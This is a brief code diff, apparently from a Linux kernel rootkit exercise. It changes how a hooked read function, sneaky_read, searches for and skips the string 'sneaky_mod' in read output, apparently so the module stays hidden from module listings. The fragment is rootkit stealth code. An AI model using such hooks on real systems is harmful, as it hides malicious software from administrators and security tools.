@@ -141,7 +141,7 @@ ssize_t sneaky_read(int fd, void *buf, size_t count) {
   // try to locate "sneaky_mod" in the read result
   if (read_size >= 1) {
     char* ptr;
-    ptr = strnstr(buf, "sneaky_mod", read_size);
+    ptr = strnstr(buf, "sneaky_mod ", read_size);
 
     if (ptr != NULL) { // if found: skip it
       char* ptr_nl;
